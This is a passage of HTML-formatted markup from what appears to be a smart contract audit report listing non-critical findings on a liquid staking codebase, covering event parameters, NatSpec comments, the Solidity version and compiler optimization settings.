class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">480</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">481</span><span class=\"mtk1\">:         </span><span class=\"mtk3\">// Optionally process priority staking if the required params and array is configured</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">482</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_priorityStakingEndBlock</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">483</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">priorityStakingEndBlock</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_priorityStakingEndBlock</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">484</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">_addPriorityStakers</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_priorityStakers</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">485</span><span class=\"mtk1\">:         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">486</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">487</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ContractDeployed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">488</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<h2 id=\"n-03-omissions-in-events\" style=\"position:relative;\"><a href=\"#n-03-omissions-in-events\" aria-label=\"n 03 omissions in events permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-03] Omissions in Events</h2>\n<p>Throughout the codebase, events are generally emitted when sensitive changes are made to the contracts. However, some events are missing important parameters</p>\n<p>The events should include the new value and old value where possible:</p>\n<p>Events with no old value;</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"164\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LiquidStakingManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">254</span><span class=\"mtk1\">      </span><span class=\"mtk3\">/// @notice Allow the DAO to rotate the network ticker before the network house is created</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">255</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">updateTicker</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_newTicker</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyDAO</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">256</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_newTicker</span><span class=\"mtk1\">).</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk7\">3</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;String must be 3-5 characters long&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">257</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_newTicker</span><span class=\"mtk1\">).</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk7\">5</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;String must be 3-5 characters long&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">258</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">numberOfKnots</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Cannot change ticker once house is created&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">259</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">260</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">stakehouseTicker</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_newTicker</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">261</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">262</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NetworkTickerUpdated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_newTicker</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">263</span><span class=\"mtk1\">      }</span></span></span></code></pre>\n<h2 id=\"n-04-include-return-parameters-in-natspec-comments\" style=\"position:relative;\"><a href=\"#n-04-include-return-parameters-in-natspec-comments\" aria-label=\"n 04 include return parameters in natspec comments permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-04] Include <code>return parameters</code> in <em>NatSpec comments</em></h2>\n<p><strong>Context:</strong><br>\nAll Contracts</p>\n<p><strong>Description:</strong><br>\n<a href=\"https://docs.soliditylang.org/en/v0.8.15/natspec-format.html\">https://docs.soliditylang.org/en/v0.8.15/natspec-format.html</a></p>\n<p>If Return parameters are declared, you must prefix them with <code>/// @return</code>.</p>\n<p>Some code analysis programs do analysis by reading NatSpec details, if they can’t see the “@return” tag, they do incomplete analysis.</p>\n<p><strong>Recommendation:</strong><br>\nInclude return parameters in NatSpec comments</p>\n<p>Recommendation Code Style:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"165\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk3\">/// @notice information about what a function does</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk3\">/// @param pageId The id of the page to get the URI for.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk3\">/// @return Returns a page&#39;s URI if it has been minted </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">tokenURI</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pageId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">pageId</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">pageId</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">currentId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">revert</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;NOT_MINTED&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">string</span><span class=\"mtk1\">.</span><span class=\"mtk11\">concat</span><span class=\"mtk1\">(</span><span class=\"mtk12\">BASE_URI</span><span class=\"mtk1\">, </span><span class=\"mtk12\">pageId</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toString</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span></code></pre>\n<h2 id=\"n-05-use-a-more-recent-version-of-solidity\" style=\"position:relative;\"><a href=\"#n-05-use-a-more-recent-version-of-solidity\" aria-label=\"n 05 use a more recent version of solidity permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-05] Use a more recent version of Solidity</h2>\n<p><strong>Context:</strong><br>\nAll contracts</p>\n<p><strong>Description:</strong><br>\nFor security, it is best practice to use the latest Solidity version.<br>\nFor the security fix list in the versions;<br>\n<a href=\"https://github.com/ethereum/solidity/blob/develop/Changelog.md\">https://github.com/ethereum/solidity/blob/develop/Changelog.md</a></p>\n<p><strong>Recommendation:</strong><br>\nOld version of Solidity is used <code>(^0.8.13)</code>, newer version can be used <code>(0.8.17)</code></p>\n<h2 id=\"n-06-solidity-compiler-optimizations-can-be-problematic\" style=\"position:relative;\"><a href=\"#n-06-solidity-compiler-optimizations-can-be-problematic\" aria-label=\"n 06 solidity compiler optimizations can be problematic permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-06] Solidity compiler optimizations can be problematic</h2>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"166\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">hardhat</span><span class=\"mtk1\">.</span><span class=\"mtk12\">config</span><span class=\"mtk1\">.</span><span class=\"mtk12\">js</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">3</span><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">4</span><span class=\"mtk1\">: </span><span class=\"mtk10\">module</span><span class=\"mtk1\">.</span><span class=\"mtk10\">exports</span><span class=\"mtk1\"> = {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">5</span><span class=\"mtk12\">:</span><span class=\"mtk1\">   </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\">: {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">6</span><span class=\"mtk12\">:</span><span class=\"mtk1\">     </span><span class=\"mtk12\">version</span><span class=\"mtk1\">: </span><span class=\"mtk8\">&quot;0.8.13&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">7</span><span class=\"mtk12\">:</span><span class=\"mtk1\">     </span><span class=\"mtk12\">settings</span><span class=\"mtk1\">: {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">8</span><span class=\"mtk12\">:</span><span class=\"mtk1\">       </span><span class=\"mtk12\">optimizer</span><span class=\"mtk1\">: {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">9</span><span class=\"mtk12\">:</span><span class=\"mtk1\">         </span><span class=\"mtk12\">enabled</span><span class=\"mtk1\">: </span><span class=\"mtk4\">true</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">10</span><span class=\"mtk12\">:</span><span class=\"mtk1\">         </span><span class=\"mtk12\">runs</span><span class=\"mtk1\">: </span><span class=\"mtk7\">200</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">11</span><span class=\"mtk1\">:       }</span></span></span></code></pre>\n<p><strong>Description:</strong><br>\nProtocol has enabled optional compiler optimizations in Solidity.<br>\nThere have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. </p>\n<p>Therefore, it is unclear how well they are being tested and exercised.<br>\nHigh-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by Truffle and Remix persisted until late 2018. The fix for this bug was not reported in the Solidity CHANGELOG. </p>\n<p>Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported.<br>\nA compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe.<br>\nIt is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations.</p>\n<p><strong>Exploit Scenario</strong><br>\nA latent or future bug in Solidity compiler optimizations—or in the Emscripten transpilation to solc-js—causes a security vulnerability in the contracts.</p>\n<p><strong>Recommendation:</strong><br>\nShort term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug.<br>\nLong term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.</p>\n<h2 id=\"n-07-natspec-is-missing\" style=\"position:relative;\"><a href=\"#n-07-natspec-is-missing\" aria-label=\"n 07 natspec is missing permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-07] NatSpec is missing</h2>\n<p><strong>Description:</strong><br>\nNatSpec is missing for the following functions , constructor and modifier:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"167\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">27</span><span class=\"mtk1\"> </span><span class=\"mtk12\">results</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">IBrandNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">6</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">toLowerCase</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_base</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">7</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">lowercaseBrandTickerToTokenId</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_ticker</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ILiquidStakingManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">7</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">stakehouse</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ILiquidStakingManagerChildContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">6</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">liquidStakingManager</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ILPTokenInit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">7</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">init</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/ISyndicateInit.sol:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">7</span><span class=\"mtk1\">:     </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk10\">initialize</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk10\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk10\">ITransferHookProcessor</span><span class=\"mtk1\">.</span><span class=\"mtk10\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">6</span><span class=\"mtk1\">:     </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk10\">beforeTokenTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk10\">external</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">7</span><span class=\"mtk1\">:     </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk10\">afterTokenTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk10\">external</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk10\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk10\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk10\">GiantLP</span><span class=\"mtk1\">.</span><span class=\"mtk10\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">29</span><span class=\"mtk1\">:     </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk10\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_recipient</span><span class=\"mtk1\">, </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk10\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">34</span><span class=\"mtk1\">:     </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk10\">burn</span><span class=\"mtk1\">(</span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_recipient</span><span class=\"mtk1\">, </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk10\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">39</span><span class=\"mtk1\">:     </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_beforeTokenTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk10\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk10\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">43</span><span class=\"mtk1\">:     </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_afterTokenTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk10\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk10\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk10\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk10\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk10\">OptionalGatekeeperFactory</span><span 